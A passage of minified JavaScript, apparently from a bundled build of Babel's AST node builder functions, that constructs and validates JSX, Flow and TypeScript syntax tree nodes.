D(J.local,Q,"local",X,1),Q}function Ds(X,Q){let J={type:"ImportSpecifier",local:X,imported:Q},Y=f.ImportSpecifier;return D(Y.local,J,"local",X,1),D(Y.imported,J,"imported",Q,1),J}function Ns(X,Q=null){let J={type:"ImportExpression",source:X,options:Q},Y=f.ImportExpression;return D(Y.source,J,"source",X,1),D(Y.options,J,"options",Q,1),J}function ws(X,Q){let J={type:"MetaProperty",meta:X,property:Q},Y=f.MetaProperty;return D(Y.meta,J,"meta",X,1),D(Y.property,J,"property",Q,1),J}function Is(X="method",Q,J,Y,W=!1,G=!1,H=!1,$=!1){let z={type:"ClassMethod",kind:X,key:Q,params:J,body:Y,computed:W,static:G,generator:H,async:$},U=f.ClassMethod;return D(U.kind,z,"kind",X),D(U.key,z,"key",Q,1),D(U.params,z,"params",J,1),D(U.body,z,"body",Y,1),D(U.computed,z,"computed",W),D(U.static,z,"static",G),D(U.generator,z,"generator",H),D(U.async,z,"async",$),z}function Cs(X){let Q={type:"ObjectPattern",properties:X},J=f.ObjectPattern;return D(J.properties,Q,"properties",X,1),Q}function y3(X){let Q={type:"SpreadElement",argument:X},J=f.SpreadElement;return D(J.argument,Q,"argument",X,1),Q}function Ps(){return{type:"Super"}}function Ss(X,Q){let J={type:"TaggedTemplateExpression",tag:X,quasi:Q},Y=f.TaggedTemplateExpression;return D(Y.tag,J,"tag",X,1),D(Y.quasi,J,"quasi",Q,1),J}function Es(X,Q=!1){let J={type:"TemplateElement",value:X,tail:Q},Y=f.TemplateElement;return D(Y.value,J,"value",X),D(Y.tail,J,"tail",Q),J}function Ts(X,Q){let J={type:"TemplateLiteral",quasis:X,expressions:Q},Y=f.TemplateLiteral;return D(Y.quasis,J,"quasis",X,1),D(Y.expressions,J,"expressions",Q,1),J}function _s(X=null,Q=!1){let J={type:"YieldExpression",argument:X,delegate:Q},Y=f.YieldExpression;return D(Y.argument,J,"argument",X,1),D(Y.delegate,J,"delegate",Q),J}function ks(X){let Q={type:"AwaitExpression",argument:X},J=f.AwaitExpression;return D(J.argument,Q,"argument",X,1),Q}function bs(){return{type:"Import"}}function vs(X){let Q={type:"ExportNamespaceSpecifier",exported:X},J=f.ExportNamespaceSpecifier;return D(J.exported,Q,"exported",X,1),Q}function xs(X,Q,J=!1,Y){let W={type:"OptionalMemberExpression",object:X,property:Q,computed:J,optional:Y},G=f.OptionalMemberExpression;return D(G.object,W,"object",X,1),D(G.property,W,"property",Q,1),D(G.computed,W,"computed",J),D(G.optional,W,"optional",Y),W}function fs(X,Q,J){let Y={type:"OptionalCallExpression",callee:X,arguments:Q,optional:J},W=f.OptionalCallExpression;return D(W.callee,Y,"callee",X,1),D(W.arguments,Y,"arguments",Q,1),D(W.optional,Y,"optional",J),Y}function hs(X,Q=null,J=null,Y=null,W=!1,G=!1){let H={type:"ClassProperty",key:X,value:Q,typeAnnotation:J,decorators:Y,computed:W,static:G},$=f.ClassProperty;return D($.key,H,"key",X,1),D($.value,H,"value",Q,1),D($.typeAnnotation,H,"typeAnnotation",J,1),D($.decorators,H,"decorators",Y,1),D($.computed,H,"computed",W),D($.static,H,"static",G),H}function ys(X,Q=null,J=null,Y=null,W=!1,G=!1){let H={type:"ClassAccessorProperty",key:X,value:Q,typeAnnotation:J,decorators:Y,computed:W,static:G},$=f.ClassAccessorProperty;return D($.key,H,"key",X,1),D($.value,H,"value",Q,1),D($.typeAnnotation,H,"typeAnnotation",J,1),D($.decorators,H,"decorators",Y,1),D($.computed,H,"computed",W),D($.static,H,"static",G),H}function gs(X,Q=null,J=null,Y=!1){let W={type:"ClassPrivateProperty",key:X,value:Q,decorators:J,static:Y},G=f.ClassPrivateProperty;return D(G.key,W,"key",X,1),D(G.value,W,"value",Q,1),D(G.decorators,W,"decorators",J,1),D(G.static,W,"static",Y),W}function ms(X="method",Q,J,Y,W=!1){let G={type:"ClassPrivateMethod",kind:X,key:Q,params:J,body:Y,static:W},H=f.ClassPrivateMethod;return D(H.kind,G,"kind",X),D(H.key,G,"key",Q,1),D(H.params,G,"params",J,1),D(H.body,G,"body",Y,1),D(H.static,G,"static",W),G}function us(X){let Q={type:"PrivateName",id:X},J=f.PrivateName;return D(J.id,Q,"id",X,1),Q}function cs(X){let Q={type:"StaticBlock",body:X},J=f.StaticBlock;return D(J.body,Q,"body",X,1),Q}function ls(X,Q){let J={type:"ImportAttribute",key:X,value:Q},Y=f.ImportAttribute;return D(Y.key,J,"key",X,1),D(Y.value,J,"value",Q,1),J}function ps(){return{type:"AnyTypeAnnotation"}}function ds(X){let Q={type:"ArrayTypeAnnotation",elementType:X},J=f.ArrayTypeAnnotation;return D(J.elementType,Q,"elementType",X,1),Q}function is(){return{type:"BooleanTypeAnnotation"}}function rs(X){let Q={type:"BooleanLiteralTypeAnnotation",value:X},J=f.BooleanLiteralTypeAnnotation;return D(J.value,Q,"value",X),Q}function ns(){return{type:"NullLiteralTypeAnnotation"}}function as(X,Q=null){let J={type:"ClassImplements",id:X,typeParameters:Q},Y=f.ClassImplements;return D(Y.id,J,"id",X,1),D(Y.typeParameters,J,"typeParameters",Q,1),J}function os(X,Q=null,J=null,Y){let W={type:"DeclareClass",id:X,typeParameters:Q,extends:J,body:Y},G=f.DeclareClass;return D(G.id,W,"id",X,1),D(G.typeParameters,W,"typeParameters",Q,1),D(G.extends,W,"extends",J,1),D(G.body,W,"body",Y,1),W}function ss(X){let Q={type:"DeclareFunction",id:X},J=f.DeclareFunction;return D(J.id,Q,"id",X,1),Q}function ts(X,Q=null,J=null,Y){let W={type:"DeclareInterface",id:X,typeParameters:Q,extends:J,body:Y},G=f.DeclareInterface;return D(G.id,W,"id",X,1),D(G.typeParameters,W,"typeParameters",Q,1),D(G.extends,W,"extends",J,1),D(G.body,W,"body",Y,1),W}function es(X,Q,J=null){let Y={type:"DeclareModule",id:X,body:Q,kind:J},W=f.DeclareModule;return D(W.id,Y,"id",X,1),D(W.body,Y,"body",Q,1),D(W.kind,Y,"kind",J),Y}function Xt(X){let Q={type:"DeclareModuleExports",typeAnnotation:X},J=f.DeclareModuleExports;return D(J.typeAnnotation,Q,"typeAnnotation",X,1),Q}function Qt(X,Q=null,J){let Y={type:"DeclareTypeAlias",id:X,typeParameters:Q,right:J},W=f.DeclareTypeAlias;return D(W.id,Y,"id",X,1),D(W.typeParameters,Y,"typeParameters",Q,1),D(W.right,Y,"right",J,1),Y}function Jt(X,Q=null,J=null){let Y={type:"DeclareOpaqueType",id:X,typeParameters:Q,supertype:J},W=f.DeclareOpaqueType;return D(W.id,Y,"id",X,1),D(W.typeParameters,Y,"typeParameters",Q,1),D(W.supertype,Y,"supertype",J,1),Y}function Yt(X){let Q={type:"DeclareVariable",id:X},J=f.DeclareVariable;return D(J.id,Q,"id",X,1),Q}function Wt(X=null,Q=null,J=null,Y=null){let W={type:"DeclareExportDeclaration",declaration:X,specifiers:Q,source:J,attributes:Y},G=f.DeclareExportDeclaration;return D(G.declaration,W,"declaration",X,1),D(G.specifiers,W,"specifiers",Q,1),D(G.source,W,"source",J,1),D(G.attributes,W,"attributes",Y,1),W}function Gt(X,Q=null){let J={type:"DeclareExportAllDeclaration",source:X,attributes:Q},Y=f.DeclareExportAllDeclaration;return D(Y.source,J,"source",X,1),D(Y.attributes,J,"attributes",Q,1),J}function Ht(X){let Q={type:"DeclaredPredicate",value:X},J=f.DeclaredPredicate;return D(J.value,Q,"value",X,1),Q}function $t(){return{type:"ExistsTypeAnnotation"}}function zt(X=null,Q,J=null,Y){let W={type:"FunctionTypeAnnotation",typeParameters:X,params:Q,rest:J,returnType:Y},G=f.FunctionTypeAnnotation;return D(G.typeParameters,W,"typeParameters",X,1),D(G.params,W,"params",Q,1),D(G.rest,W,"rest",J,1),D(G.returnType,W,"returnType",Y,1),W}function Ut(X=null,Q){let J={type:"FunctionTypeParam",name:X,typeAnnotation:Q},Y=f.FunctionTypeParam;return D(Y.name,J,"name",X,1),D(Y.typeAnnotation,J,"typeAnnotation",Q,1),J}function Kt(X,Q=null){let J={type:"GenericTypeAnnotation",id:X,typeParameters:Q},Y=f.GenericTypeAnnotation;return D(Y.id,J,"id",X,1),D(Y.typeParameters,J,"typeParameters",Q,1),J}function Vt(){return{type:"InferredPredicate"}}function Bt(X,Q=null){let J={type:"InterfaceExtends",id:X,typeParameters:Q},Y=f.InterfaceExtends;return D(Y.id,J,"id",X,1),D(Y.typeParameters,J,"typeParameters",Q,1),J}function qt(X,Q=null,J=null,Y){let W={type:"InterfaceDeclaration",id:X,typeParameters:Q,extends:J,body:Y},G=f.InterfaceDeclaration;return D(G.id,W,"id",X,1),D(G.typeParameters,W,"typeParameters",Q,1),D(G.extends,W,"extends",J,1),D(G.body,W,"body",Y,1),W}function Zt(X=null,Q){let J={type:"InterfaceTypeAnnotation",extends:X,body:Q},Y=f.InterfaceTypeAnnotation;return D(Y.extends,J,"extends",X,1),D(Y.body,J,"body",Q,1),J}function Mt(X){let Q={type:"IntersectionTypeAnnotation",types:X},J=f.IntersectionTypeAnnotation;return D(J.types,Q,"types",X,1),Q}function jt(){return{type:"MixedTypeAnnotation"}}function Ft(){return{type:"EmptyTypeAnnotation"}}function Ot(X){let Q={type:"NullableTypeAnnotation",typeAnnotation:X},J=f.NullableTypeAnnotation;return D(J.typeAnnotation,Q,"typeAnnotation",X,1),Q}function At(X){let Q={type:"NumberLiteralTypeAnnotation",value:X},J=f.NumberLiteralTypeAnnotation;return D(J.value,Q,"value",X),Q}function Rt(){return{type:"NumberTypeAnnotation"}}function Lt(X,Q=[],J=[],Y=[],W=!1){let G={type:"ObjectTypeAnnotation",properties:X,indexers:Q,callProperties:J,internalSlots:Y,exact:W},H=f.ObjectTypeAnnotation;return D(H.properties,G,"properties",X,1),D(H.indexers,G,"indexers",Q,1),D(H.callProperties,G,"callProperties",J,1),D(H.internalSlots,G,"internalSlots",Y,1),D(H.exact,G,"exact",W),G}function Dt(X,Q,J,Y,W){let G={type:"ObjectTypeInternalSlot",id:X,value:Q,optional:J,static:Y,method:W},H=f.ObjectTypeInternalSlot;return D(H.id,G,"id",X,1),D(H.value,G,"value",Q,1),D(H.optional,G,"optional",J),D(H.static,G,"static",Y),D(H.method,G,"method",W),G}function Nt(X){let Q={type:"ObjectTypeCallProperty",value:X,static:null},J=f.ObjectTypeCallProperty;return D(J.value,Q,"value",X,1),Q}function wt(X=null,Q,J,Y=null){let W={type:"ObjectTypeIndexer",id:X,key:Q,value:J,variance:Y,static:null},G=f.ObjectTypeIndexer;return D(G.id,W,"id",X,1),D(G.key,W,"key",Q,1),D(G.value,W,"value",J,1),D(G.variance,W,"variance",Y,1),W}function It(X,Q,J=null){let Y={type:"ObjectTypeProperty",key:X,value:Q,variance:J,kind:null,method:null,optional:null,proto:null,static:null},W=f.ObjectTypeProperty;return D(W.key,Y,"key",X,1),D(W.value,Y,"value",Q,1),D(W.variance,Y,"variance",J,1),Y}function Ct(X){let Q={type:"ObjectTypeSpreadProperty",argument:X},J=f.ObjectTypeSpreadProperty;return D(J.argument,Q,"argument",X,1),Q}function Pt(X,Q=null,J=null,Y){let W={type:"OpaqueType",id:X,typeParameters:Q,supertype:J,impltype:Y},G=f.OpaqueType;return D(G.id,W,"id",X,1),D(G.typeParameters,W,"typeParameters",Q,1),D(G.supertype,W,"supertype",J,1),D(G.impltype,W,"impltype",Y,1),W}function St(X,Q){let J={type:"QualifiedTypeIdentifier",id:X,qualification:Q},Y=f.QualifiedTypeIdentifier;return D(Y.id,J,"id",X,1),D(Y.qualification,J,"qualification",Q,1),J}function Et(X){let Q={type:"StringLiteralTypeAnnotation",value:X},J=f.StringLiteralTypeAnnotation;return D(J.value,Q,"value",X),Q}function Tt(){return{type:"StringTypeAnnotation"}}function _t(){return{type:"SymbolTypeAnnotation"}}function kt(){return{type:"ThisTypeAnnotation"}}function bt(X){let Q={type:"TupleTypeAnnotation",types:X},J=f.TupleTypeAnnotation;return D(J.types,Q,"types",X,1),Q}function vt(X){let Q={type:"TypeofTypeAnnotation",argument:X},J=f.TypeofTypeAnnotation;return D(J.argument,Q,"argument",X,1),Q}function xt(X,Q=null,J){let Y={type:"TypeAlias",id:X,typeParameters:Q,right:J},W=f.TypeAlias;return D(W.id,Y,"id",X,1),D(W.typeParameters,Y,"typeParameters",Q,1),D(W.right,Y,"right",J,1),Y}function ft(X){let Q={type:"TypeAnnotation",typeAnnotation:X},J=f.TypeAnnotation;return D(J.typeAnnotation,Q,"typeAnnotation",X,1),Q}function ht(X,Q){let J={type:"TypeCastExpression",expression:X,typeAnnotation:Q},Y=f.TypeCastExpression;return D(Y.expression,J,"expression",X,1),D(Y.typeAnnotation,J,"typeAnnotation",Q,1),J}function yt(X=null,Q=null,J=null){let Y={type:"TypeParameter",bound:X,default:Q,variance:J,name:null},W=f.TypeParameter;return D(W.bound,Y,"bound",X,1),D(W.default,Y,"default",Q,1),D(W.variance,Y,"variance",J,1),Y}function gt(X){let Q={type:"TypeParameterDeclaration",params:X},J=f.TypeParameterDeclaration;return D(J.params,Q,"params",X,1),Q}function mt(X){let Q={type:"TypeParameterInstantiation",params:X},J=f.TypeParameterInstantiation;return D(J.params,Q,"params",X,1),Q}function ut(X){let Q={type:"UnionTypeAnnotation",types:X},J=f.UnionTypeAnnotation;return D(J.types,Q,"types",X,1),Q}function ct(X){let Q={type:"Variance",kind:X},J=f.Variance;return D(J.kind,Q,"kind",X),Q}function lt(){return{type:"VoidTypeAnnotation"}}function pt(X,Q){let J={type:"EnumDeclaration",id:X,body:Q},Y=f.EnumDeclaration;return D(Y.id,J,"id",X,1),D(Y.body,J,"body",Q,1),J}function dt(X){let Q={type:"EnumBooleanBody",members:X,explicitType:null,hasUnknownMembers:null},J=f.EnumBooleanBody;return D(J.members,Q,"members",X,1),Q}function it(X){let Q={type:"EnumNumberBody",members:X,explicitType:null,hasUnknownMembers:null},J=f.EnumNumberBody;return D(J.members,Q,"members",X,1),Q}function rt(X){let Q={type:"EnumStringBody",members:X,explicitType:null,hasUnknownMembers:null},J=f.EnumStringBody;return D(J.members,Q,"members",X,1),Q}function nt(X){let Q={type:"EnumSymbolBody",members:X,hasUnknownMembers:null},J=f.EnumSymbolBody;return D(J.members,Q,"members",X,1),Q}function at(X){let Q={type:"EnumBooleanMember",id:X,init:null},J=f.EnumBooleanMember;return D(J.id,Q,"id",X,1),Q}function ot(X,Q){let J={type:"EnumNumberMember",id:X,init:Q},Y=f.EnumNumberMember;return D(Y.id,J,"id",X,1),D(Y.init,J,"init",Q,1),J}function st(X,Q){let J={type:"EnumStringMember",id:X,init:Q},Y=f.EnumStringMember;return D(Y.id,J,"id",X,1),D(Y.init,J,"init",Q,1),J}function tt(X){let Q={type:"EnumDefaultedMember",id:X},J=f.EnumDefaultedMember;return D(J.id,Q,"id",X,1),Q}function et(X,Q){let J={type:"IndexedAccessType",objectType:X,indexType:Q},Y=f.IndexedAccessType;return D(Y.objectType,J,"objectType",X,1),D(Y.indexType,J,"indexType",Q,1),J}function Xe(X,Q){let J={type:"OptionalIndexedAccessType",objectType:X,indexType:Q,optional:null},Y=f.OptionalIndexedAccessType;return D(Y.objectType,J,"objectType",X,1),D(Y.indexType,J,"indexType",Q,1),J}function Qe(X,Q=null){let J={type:"JSXAttribute",name:X,value:Q},Y=f.JSXAttribute;return D(Y.name,J,"name",X,1),D(Y.value,J,"value",Q,1),J}function Je(X){let Q={type:"JSXClosingElement",name:X},J=f.JSXClosingElement;return D(J.name,Q,"name",X,1),Q}function Ye(X,Q=null,J,Y=null){let W={type:"JSXElement",openingElement:X,closingElement:Q,children:J,selfClosing:Y},G=f.JSXElement;return D(G.openingElement,W,"openingElement",X,1),D(G.closingElement,W,"closingElement",Q,1),D(G.children,W,"children",J,1),D(G.selfClosing,W,"selfClosing",Y),W}function We(){return{type:"JSXEmptyExpression"}}function Ge(X){let Q={type:"JSXExpressionContainer",expression:X},J=f.JSXExpressionContainer;return D(J.expression,Q,"expression",X,1),Q}function He(X){let Q={type:"JSXSpreadChild",expression:X},J=f.JSXSpreadChild;return D(J.expression,Q,"expression",X,1),Q}function $e(X){let Q={type:"JSXIdentifier",name:X},J=f.JSXIdentifier;return D(J.name,Q,"name",X),Q}function ze(X,Q){let J={type:"JSXMemberExpression",object:X,property:Q},Y=f.JSXMemberExpression;return D(Y.object,J,"object",X,1),D(Y.property,J,"property",Q,1),J}function Ue(X,Q){let J={type:"JSXNamespacedName",namespace:X,name:Q},Y=f.JSXNamespacedName;return D(Y.namespace,J,"namespace",X,1),D(Y.name,J,"name",Q,1),J}function Ke(X,Q,J=!1){let Y={type:"JSXOpeningElement",name:X,attributes:Q,selfClosing:J},W=f.JSXOpeningElement;return D(W.name,Y,"name",X,1),D(W.attributes,Y,"attributes",Q,1),D(W.selfClosing,Y,"selfClosing",J),Y}function Ve(X){let Q={type:"JSXSpreadAttribute",argument:X},J=f.JSXSpreadAttribute;return D(J.argument,Q,"argument",X,1),Q}function Be(X){let Q={type:"JSXText",value:X},J=f.JSXText;return D(J.value,Q,"value",X),Q}function qe(X,Q,J){let Y={type:"JSXFragment",openingFragment:X,closingFragment:Q,children:J},W=f.JSXFragment;return D(W.openingFragment,Y,"openingFragment",X,1),D(W.closingFragment,Y,"closingFragment",Q,1),D(W.children,Y,"children",J,1),Y}function Ze(){return{type:"JSXOpeningFragment"}}function Me(){return{type:"JSXClosingFragment"}}function je(){return{type:"Noop"}}function Fe(X,Q){let J={type:"Placeholder",expectedNode:X,name:Q},Y=f.Placeholder;return D(Y.expectedNode,J,"expectedNode",X),D(Y.name,J,"name",Q,1),J}function Oe(X){let Q={type:"V8IntrinsicIdentifier",name:X},J=f.V8IntrinsicIdentifier;return D(J.name,Q,"name",X),Q}function Ae(){return{type:"ArgumentPlaceholder"}}function Re(X,Q){let J={type:"BindExpression",object:X,callee:Q},Y=f.BindExpression;return D(Y.object,J,"object",X,1),D(Y.callee,J,"callee",Q,1),J}function Le(X){let Q={type:"Decorator",expression:X},J=f.Decorator;return D(J.expression,Q,"expression",X,1),Q}function De(X,Q=!1){let J={type:"DoExpression",body:X,async:Q},Y=f.DoExpression;return D(Y.body,J,"body",X,1),D(Y.async,J,"async",Q),J}function Ne(X){let Q={type:"ExportDefaultSpecifier",exported:X},J=f.ExportDefaultSpecifier;return D(J.exported,Q,"exported",X,1),Q}function we(X){let Q={type:"RecordExpression",properties:X},J=f.RecordExpression;return D(J.properties,Q,"properties",X,1),Q}function Ie(X=[]){let Q={type:"TupleExpression",elements:X},J=f.TupleExpression;return D(J.elements,Q,"elements",X,1),Q}function Ce(X){let Q={type:"DecimalLiteral",value:X},J=f.DecimalLiteral;return D(J.value,Q,"value",X),Q}function Pe(X){let Q={type:"ModuleExpression",body:X},J=f.ModuleExpression;return D(J.body,Q,"body",X,1),Q}function Se(){return{type:"TopicReference"}}function Ee(X){let Q={type:"PipelineTopicExpression",expression:X},J=f.PipelineTopicExpression;return D(J.expression,Q,"expression",X,1),Q}function Te(X){let Q={type:"PipelineBareFunction",callee:X},J=f.PipelineBareFunction;return D(J.callee,Q,"callee",X,1),Q}function _e(){return{type:"PipelinePrimaryTopicReference"}}function ke(){return{type:"VoidPattern"}}function be(X){let Q={type:"TSParameterProperty",parameter:X},J=f.TSParameterProperty;return D(J.parameter,Q,"parameter",X,1),Q}function ve(X=null,Q=null,J,Y=null){let W={type:"TSDeclareFunction",id:X,typeParameters:Q,params:J,returnType:Y},G=f.TSDeclareFunction;return D(G.id,W,"id",X,1),D(G.typeParameters,W,"typeParameters",Q,1),D(G.params,W,"params",J,1),D(G.returnType,W,"returnType",Y,1),W}function xe(X=null,Q,J=null,Y,W=null){let G={type:"TSDeclareMethod",decorators:X,key:Q,typeParameters:J,params:Y,returnType:W},H=f.TSDeclareMethod;return D(H.decorators,G,"decorators",X,1),D(H.key,G,"key",Q,1),D(H.typeParameters,G,"typeParameters",J,1),D(H.params,G,"params",Y,1),D(H.returnType,G,"returnType",W,1),G}function fe(X,Q){let J={type:"TSQualifiedName",left:X,right:Q},Y=f.TSQualifiedName;return D(Y.left,J,"left",X,1),D(Y.right,J,"right",Q,1),J}function he(X=null,Q,J=null){let Y={type:"TSCallSignatureDeclaration",typeParameters:X,parameters:Q,typeAnnotation:J},W=f.TSCallSignatureDeclaration;return D(W.typeParameters,Y,"typeParameters",X,1),D(W.parameters,Y,"parameters",Q,1),D(W.typeAnnotation,Y,"typeAnnotation",J,1),Y}function ye(X=null,Q,J=null){let Y={type:"TSConstructSignatureDeclaration",typeParameters:X,parameters:Q,typeAnnotation:J},W=f.TSConstructSignatureDeclaration;return D(W.typeParameters,Y,"typeParameters",X,1),D(W.parameters,Y,"parameters",Q,1),D(W.typeAnnotation,Y,"typeAnnotation",J,1),Y}function ge(X,Q=null){let J={type:"TSPropertySignature",key:X,typeAnnotation:Q},Y=f.TSPropertySignature;return D(Y.key,J,"key",X,1),D(Y.typeAnnotation,J,"typeAnnotation",Q,1),J}function me(X,Q=null,J,Y=null){let W={type:"TSMethodSignature",key:X,typeParameters:Q,parameters:J,typeAnnotation:Y,kind:null},G=f.TSMethodSignature;return D(G.key,W,"key",X,1),D(G.typeParameters,W,"typeParameters",Q,1),D(G.parameters,W,"parameters",J,1),D(G.typeAnnotation,W,"typeAnnotation",Y,1),W}function ue(X,Q=null){let J={type:"TSIndexSignature",parameters:X,typeAnnotation:Q},Y=f.TSIndexSignature;return D(Y.parameters,J,"parameters",X,1),D(Y.typeAnnotation,J,"typeAnnotation",Q,1),J}function ce(){return{type:"TSAnyKeyword"}}function le(){return{type:"TSBooleanKeyword"}}function pe(){return{type:"TSBigIntKeyword"}}function de(){return{type:"TSIntrinsicKeyword"}}function ie(){return{type:"TSNeverKeyword"}}function re(){return{type:"TSNullKeyword"}}function ne(){return{type:"TSNumberKeyword"}}function ae(){return{type:"TSObjectKeyword"}}function oe(){return{type:"TSStringKeyword"}}function se(){return{type:"TSSymbolKeyword"}}function te(){return{type:"TSUndefinedKeyword"}}function ee(){return{type:"TSUnknownKeyword"}}function X11(){return{type:"TSVoidKeyword"}}function Q11(){return{type:"TSThisType"}}function J11(X=null,Q,J=null){let Y={type:"TSFunctionType",typeParameters:X,parameters:Q,typeAnnotation:J},W=f.TSFunctionType;return D(W.typeParameters,Y,"typeParameters",X,1),D(W.parameters,Y,"parameters",Q,1),D(W.typeAnnotation,Y,"typeAnnotation",J,1),Y}function Y11(X=null,Q,J=null){let Y={type:"TSConstructorType",typeParameters:X,parameters:Q,typeAnnotation:J},W=f.TSConstructorType;return D(W.typeParameters,Y,"typeParameters",X,1),D(W.parameters,Y,"parameters",Q,1),D(W.typeAnnotation,Y,"typeAnnotation",J,1),Y}function W11(X,Q=null){let J={type:"TSTypeReference",typeName:X,typeParameters:Q},Y=f.TSTypeReference;return D(Y.typeName,J,"typeName",X,1),D(Y.typeParameters,J,"typeParameters",Q,1),J}function G11(X,Q=null,J=null){let Y={type:"TSTypePredicate",parameterName:X,typeAnnotation:Q,asserts:J},W=f.TSTypePredicate;return D(W.parameterName,Y,"parameterName",X,1),D(W.typeAnnotation,Y,"typeAnnotation",Q,1),D(W.asserts,Y,"asserts",J),Y}function H11(X,Q=null){let J={type:"TSTypeQuery",exprName:X,typeParameters:Q},Y=f.TSTypeQuery;return D(Y.exprName,J,"exprName",X,1),D(Y.typeParameters,J,"typeParameters",Q,1),J}function $11(X){let Q={type:"TSTypeLiteral",members:X},J=f.TSTypeLiteral;return D(J.members,Q,"members",X,1),Q}function z11(X){let Q={type:"TSArrayType",elementType:X},J=f.TSArrayType;return D(J.elementType,Q,"elementType",X,1),Q}function U11(X){let Q={type:"TSTupleType",elementTypes:X},J=f.TSTupleType;return D(J.elementTypes,Q,"elementTypes",X,1),Q}function K11(X){let Q={type:"TSOptionalType",typeAnnotation:X},J=f.TSOptionalType;return D(J.typeAnnotation,Q,"typeAnnotation",X,1),Q}function V11(X){let Q={type:"TSRestType",typeAnnotation:X},J=f.TSRestType;return D(J.typeAnnotation,Q,"typeAnnotation",X,1),Q}function B11(X,Q,J=!1){let Y={type:"TSNamedTupleMember",label:X,elementType:Q,optional:J},W=f.TSNamedTupleMember;return D(W.label,Y,"label",X,1),D(W.elementType,Y,"elementType",Q,1),D(W.optional,Y,"optional",J),Y}function q11(X){let Q={type:"TSUnionType",types:X},J=f.TSUnionType;return D(J.types,Q,"types",X,1),Q}function Z11(X){let Q={type:"TSIntersectionType",types:X},J=f.TSIntersectionType;return D(J.types,Q,"types",X,1),Q}function M11(X,Q,J,Y){let W={type:"TSConditionalType",checkType:X,extendsType:Q,trueType:J,falseType:Y},G=f.TSConditionalType;return D(G.checkType,W,"checkType",X,1),D(G.extendsType,W,"extendsType",Q,1),D(G.trueType,W,"trueType",J,1),D(G.falseType,W,"falseType",Y,1),W}function j11(X){let Q={type:"TSInferType",typeParameter:X},J=f.TSInferType;return D(J.typeParameter,Q,"typeParameter",X,1),Q}function F11(X){let Q={type:"TSParenthesizedType",typeAnnotation:X},J=f.TSParenthesizedType;return D(J.typeAnnotation,Q,"typeAnnotation",X,1),Q}function O11(X,Q="keyof"){let J={type:"TSTypeOperator",typeAnnotation:X,operator:Q},Y=f.TSTypeOperator;return D(Y.typeAnnotation,J,"typeAnnotation",X,1),D(Y.operator,J,"operator",Q),J}function A11(X,Q){let J={type:"TSIndexedAccessType",objectType:X,indexType:Q},Y=f.TSIndexedAccessType;return D(Y.objectType,J,"objectType",X,1),D(Y.indexType,J,"indexType",Q,1),J}function R11(X,Q=null,J=null){let Y={type:"TSMappedType",typeParameter:X,typeAnnotation:Q,nameType:J},W=f.TSMappedType;return D(W.typeParameter,Y,"typeParameter",X,1),D(W.typeAnnotation,Y,"typeAnnotation",Q,1),D(W.nameType,Y,"nameType",J,1),Y}function L11(X,Q){let J={type:"TSTemplateLiteralType",quasis:X,types:Q},Y=f.TSTemplateLiteralType;return D(Y.quasis,J,"quasis",X,1),D(Y.types,J,"types",Q,1),J}function D11(X){let Q={type:"TSLiteralType",literal:X},J=f.TSLiteralType;return D(J.literal,Q,"literal",X,1),Q}function N11(X,Q=null){let J={type:"TSExpressionWithTypeArguments",expression:X,typeParameters:Q},Y=f.TSExpressionWithTypeArguments;return D(Y.expression,J,"expression",X,1),D(Y.typeParameters,J,"typeParameters",Q,1),J}function w11(X,Q=null,J=null,Y){let W={type:"TSInterfaceDeclaration",id:X,typeParameters:Q,extends:J,body:Y},G=f.TSInterfaceDeclaration;return D(G.id,W,"id",X,1),D(G.typeParameters,W,"typeParameters",Q,1),D(G.extends,W,"extends",J,1),D(G.body,W,"body",Y,1),W}function I11(X){let Q={type:"TSInterfaceBody",body:X},J=f.TSInterfaceBody;return D(J.body,Q,"body",X,1),Q}function C11(X,Q=null,J){let Y={type:"TSTypeAliasDeclaration",id:X,typeParameters:Q,typeAnnotation:J},W=f.TSTypeAliasDeclaration;return D(W.id,Y,"id",X,1),D(W.typeParameters,Y,"typeParameters",Q,1),D(W.typeAnnotation,Y,"typeAnnotation",J,1),Y}function P11(X,Q=null){let J={type:"TSInstantiationExpression",expression:X,typeParameters:Q},Y=f.TSInstantiationExpression;return D(Y.expression,J,"expression",X,1),D(Y.typeParameters,J,"typeParameters",Q,1),J}function S11(X,Q){let J={type:"TSAsExpression",expression:X,typeAnnotation:Q},Y=f.TSAsExpression;return D(Y.expression,J,"expression",X,1),D(Y.typeAnnotation,J,"typeAnnotation",Q,1),J}function E11(X,Q){let J={type:"TSSatisfiesExpression",expression:X,typeAnnotation:Q},Y=f.TSSatisfiesExpression;return D(Y.expression,J,"expression",X,1),D(Y.typeAnnotation,J,"typeAnnotation",Q,1),J}function T11(X,Q){let J={type:"TSTypeAssertion",typeAnnotation:X,expression:Q},Y=f.TSTypeAssertion;return D(Y.typeAnnotation,J,"typeAnnotation",X,1),D(Y.expression,J,"expression",Q,1),J}function _11(X){let Q={type:"TSEnumBody",members:X},J=f.TSEnumBody;return D(J.members,Q,"members",X,1),Q}function k11(X,Q){let J={type:"TSEnumDeclaration",id:X,members:Q},Y=f.TSEnumDeclaration;return D(Y.id,J,"id",X,1),D(Y.members,J,"members",Q,1),J}function b11(X,Q=null){let J={type:"TSEnumMember",id:X,initializer:Q},Y=f.TSEnumMember;return D(Y.id,J,"id",X,1),D(Y.initializer,J,"initializer",Q,1),J}function v11(X,Q){let J={type:"TSModuleDeclaration",id:X,body:Q,kind:null},Y=f.TSModuleDeclaration;return D(Y.id,J,"id",X,1),D(Y.body,J,"body",Q,1),J}function x11(X){let Q={type:"TSModuleBlock",body:X},J=f.TSModuleBlock;return D(J.body,Q,"body",X,1),Q}function f11(X,Q=null,J=null){let Y={type:"TSImportType",argument:X,qualifier:Q,typeParameters:J},W=f.TSImportType;return D(W.argument,Y,"argument",X,1),D(W.qualifier,Y,"qualifier",Q,1),D(W.typeParameters,Y,"typeParameters",J,1),Y}function h11(X,Q){let J={type:"TSImportEqualsDeclaration",id:X,moduleReference:Q,isExport:null},Y=f.TSImportEqualsDeclaration;return D(Y.id,J,"id",X,1),D(Y.moduleReference,J,"moduleReference",Q,1),J}function y11(X){let Q={type:"TSExternalModuleReference",expression:X},J=f.TSExternalModuleReference;return D(J.expression,Q,"expression",X,1),Q}function g11(X){let Q={type:"TSNonNullExpression",expression:X},J=f.TSNonNullExpression;return D(J.expression,Q,"expression",X,1),Q}function m11(X){let Q={type:"TSExportAssignment",expression:X},J=f.TSExportAssignment;return D(J.expression,Q,"expression",X,1),Q}function u11(X){let Q={type:"TSNamespaceExportDeclaration",id:X},J=f.TSNamespaceExportDeclaration;return D(J.id,Q,"id",X,1),Q}function c11(X){let Q={type:"TSTypeAnnotation",typeAnnotation:X},J=f.TSTypeAnnotation;return 